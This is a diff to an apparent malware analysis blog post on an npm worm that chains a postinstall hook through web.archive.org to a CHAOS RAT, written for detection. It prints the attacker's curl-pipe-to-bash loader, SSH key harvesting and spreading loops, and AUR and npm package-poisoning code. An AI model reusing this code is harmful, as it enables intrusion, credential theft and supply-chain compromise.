@@ -2,6 +2,7 @@
 title: "An npm worm that hides behind web.archive.org"
 description: "A typosquatted @angular/core clone chains a postinstall hook through the Internet Archive to a CHAOS RAT, then worms across SSH, the AUR and npm. The full chain, the host artifacts to alert on, and two YARA rules."
 pubDate: 2026-10-07
+updatedDate: 2026-10-08
 tags: [npm, Supply Chain, Malware, Linux, Detection, YARA]
 ---
 
@@ -59,7 +60,28 @@ The campaign is wider than this one account. OSV lists `@angulra/core` with the 
 
 Each fake package's manifest declares a `postinstall` script, the lifecycle hook npm runs automatically once the tarball lands. This one curls a file the attacker calls `node.js` (SHA-256 `b4fdaf46a9817f828eb7bc29c9319953a9e06fba2bc2325c972bc25d4ed219d5`) from a `gitflic.ru` repository, wrapped in a `web.archive.org` URL (the Internet Archive's Wayback Machine), and pipes it into node.
 
-That script does one thing: it curls `linux.sh` through the same archive trick and pipes it into bash. A commented-out PowerShell branch sits next to it, so Windows support is planned but not in this build.
+Here is the whole file, all 503 bytes of it:
+
+```js
+const { exec } = require("child_process");
+const { platform } = require('node:process');
+
+if (process.platform === "linux") {
+        exec("curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh | bash", ()=>{});
+} /*else if (process.platform === "win32") {
+        exec("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -Command iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/windows.ps1'))", ()=>{});
+}*/
+```
+
+That script does one thing: it curls `linux.sh` through the same archive trick and pipes it into bash. A commented-out PowerShell branch sits next to it with an `example.com` placeholder, so Windows support is planned but not in this build.
+
+The worm's own source uses the same wrapped-URL pattern for all three artifacts it pulls:
+
+```bash
+__linux_script_url='https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh'
+__linux_binary_url='https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=systemd-fontd'
+__node_script_url='https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js'
+```
 
 So the chain is package, node, bash, payload. Here it is end to end:
 
@@ -86,11 +108,62 @@ The payload (SHA-256 `4ab643f49ee2a86c36ba665d7a3e5b91997d1da2840d64a0483d2b477c
 
 Its config is a base64 JSON blob holding the C2 address, port, and token. The key names are randomized per build, so a signature written on the config strings stops matching as soon as the operator rebuilds. This build points at a Tor v3 hidden service, `lpdt2hbzom3uxxq4dutlnypca3ym5c6h7g6fooi4qgz4m5qpcvrpczid.onion`, on port 80.
 
+Decoded, with the token elided:
+
+```json
+{
+  "UWi4wFtL9j": "80",
+  "qG8ut5UyEA": "lpdt2hbzom3uxxq4dutlnypca3ym5c6h7g6fooi4qgz4m5qpcvrpczid.onion",
+  "z3qujLWM7W": "<HS256 JWT, elided>"
+}
+```
+
+The binary is stripped, but Go keeps `.gopclntab`, so the config load is recoverable from `main.main`:
+
+```asm
+; main.main
+call utils.ReadConfigFile    ; base64-decode + JSON unmarshal a 356-byte .data blob
+call ui.ShowMenu             ; menu title "CHAOS (%s)"
+call environment.Load        ; ServerAddress, ServerPort, mode
+```
+
 The implant never talks to that onion directly. It dials through a Tor SOCKS5 proxy at `127.0.0.1:9050` that the worm installs alongside it, so the host's clearnet traffic never touches the C2. If you're writing network detection for this, destination IOCs won't help. What's observable is a Tor process where nobody installed Tor, and the units that set the proxy up.
 
 Persistence has a root and a non-root variant, both named like font services.
 
-**Root:** the implant lands at `/usr/lib/systemd/systemd-fontrenderd`, with a unit at `/etc/systemd/system/systemd-fontrenderd.service` described as "Font Rendering Service". The worm then sets `chattr +i` on the binary and the unit, so an admin who spots them can't delete them without clearing the immutable flag first.
+**Root:** the implant lands at `/usr/lib/systemd/systemd-fontrenderd`, with a unit at `/etc/systemd/system/systemd-fontrenderd.service` described as "Font Rendering Service". The deploy function enables Tor, drops the binary, sets it immutable, then does the same to the unit:
+
+```bash
+__deploy_fontrenderd() {
+  systemctl enable --now tor.service
+  curl -L "$__linux_binary_url" -o /usr/lib/systemd/systemd-fontrenderd
+  chmod +x /usr/lib/systemd/systemd-fontrenderd
+  chattr +i /usr/lib/systemd/systemd-fontrenderd
+  # … writes the unit file, enables it, then:
+  chattr +i /etc/systemd/system/systemd-fontrenderd.service
+  chattr +i /etc/systemd/system/multi-user.target.wants/systemd-fontrenderd.service
+}
+```
+
+The unit it writes injects the SOCKS5 proxy and tells systemd to leave the process alone:
+
+```ini
+# /etc/systemd/system/systemd-fontrenderd.service
+[Unit]
+Description=Font Rendering Service
+Wants=tor.service
+After=tor.service
+
+[Service]
+Environment="HTTP_PROXY=socks5://127.0.0.1:9050"
+ExecStart=/usr/lib/systemd/systemd-fontrenderd
+KillMode=none
+
+[Install]
+WantedBy=multi-user.target
+```
+
+The `chattr +i` on both the binary and the unit means an admin who spots them can't delete them without clearing the immutable flag first.
 
 **Non-root:** a Tor expert bundle unpacks under `~/.config/systemd/systemd-fontrenderd/`, the implant goes to `~/.config/systemd/systemd-fontcached`, and matching user units enable both at login.
 
@@ -100,25 +173,67 @@ Capabilities are the standard CHAOS set: remote shell through `sh -c`, file uplo
 
 The bash worm, `linux.sh` (SHA-256 `b1a1429d4af8af4384d546b4544ddf5db4bcbb48bec0c58aadd1b5973f42617b`), handles propagation. The RAT compromises one machine, and this script is what carries it to others.
 
-First, credentials. It harvests every SSH private key under `/home/*`, `/root`, and `/mnt/c/Users/*`, so WSL (Windows Subsystem for Linux) setups are included. It merges every `known_hosts` on the box, tries each key against each host, and on success runs the same `curl | bash` there. One developer machine with a shared key can spread it across an internal network.
+First, credentials. It harvests every SSH private key under `/home/*`, `/root`, and `/mnt/c/Users/*`, so WSL (Windows Subsystem for Linux) setups are included:
+
+```bash
+for __key in $(file {/home/*,/root,/mnt/c/Users/*}/.ssh/** | grep -F "OpenSSH private key" | cut -d":" -f1)
+```
+
+It merges every `known_hosts` on the box, tries each key against each host through every ssh config it finds, and on success runs the same `curl | bash` there:
+
+```bash
+for __host in $(cut -d' ' -f1 "$__known_hosts" | sort -u); do
+  for __config in /home/*/.ssh/config /etc/ssh/ssh_config /mnt/c/Users/*/.ssh/config /root/.ssh/config; do
+    __infect_host -F "$__config" -i "$1" "ssh://$__host" &
+  done
+  __infect_host -l root -i "$1" "ssh://$__host" &
+done
+
+__infect_host() {
+  # … connect, check uname …
+  __ssh $@ "nohup curl -L '$__linux_script_url' | nohup bash >/dev/null 2>&1"
+}
+```
+
+One developer machine with a shared key can spread it across an internal network.
 
 Then it attacks the two supply chains the victim participates in.
 
-On the AUR (Arch User Repository):
+On the AUR (Arch User Repository), for each package the victim maintains it appends a hook to the `.install` file, bumps `pkgrel`, and pushes an `upgpkg:` commit under the maintainer's own git identity:
 
-* It lists the victim's packages.
-* It appends `bash <(curl -L <linux.sh>)` to each package's `post_install` hook.
-* It bumps `pkgrel` (the PKGBUILD's release number).
-* It pushes an `upgpkg:` commit under the maintainer's own git identity.
+```bash
+__do_aur_update() {
+  # … clone ssh://aur@aur.archlinux.org/$1.git, source PKGBUILD …
+  ((pkgrel++))
+  printf '\n%s\n' "bash <(curl -L '$__linux_script_url')" >> "$install"
+  sed -E -i "s/pkgrel = [0-9]+/pkgrel = $pkgrel/" .SRCINFO
+  git config user.email "$(git log -1 --pretty=format:'%ae')"
+  git config user.name  "$(git log -1 --pretty=format:'%an')"
+  git commit -m "upgpkg: $__fullpkgver" -a --no-gpg-sign
+  # … git push with random-backoff retries …
+}
+```
 
-On npm:
+To anyone reading AUR history, it looks like routine maintenance.
 
-* It walks every `package.json` on disk outside `node_modules`.
-* It prepends `curl -L <node.js> | node` to the postinstall.
-* It bumps the patch version.
-* It publishes with every `.npmrc` it can find.
+On npm, for every `package.json` on disk outside `node_modules`, it chains its own curl onto the existing postinstall, bumps the patch version, and publishes with every `.npmrc` it can find:
 
-The last step of the npm branch hides the change. After publishing, it restores the original `package.json`. The working tree looks unchanged while the registry serves the trojanized version, and the only trace is a patch-version bump.
+```bash
+__do_npm_update() {
+  local __postinstall="$(npm pkg get scripts.postinstall)"
+  [ -n "$__postinstall" ] && local __postinstall+=' & '
+  local __postinstall+="curl -L $__node_script_url | node"
+  npm pkg set scripts.postinstall="$__postinstall"
+  npm --no-git-tag-version version patch
+  for NPM_CONFIG_USERCONFIG in {/home/*,.,/mnt/c/Users/*,/root}/.npmrc "$PREFIX/etc/npmrc"; do
+    export NPM_CONFIG_USERCONFIG; npm publish &
+  done
+  wait
+  mv -f "$__package_json_orig" package.json   # put the original back
+}
+```
+
+The last line hides the change. After publishing, it restores the original `package.json`. The working tree looks unchanged while the registry serves the trojanized version, and the only trace is a patch-version bump.
 
 ```mermaid
 flowchart TD
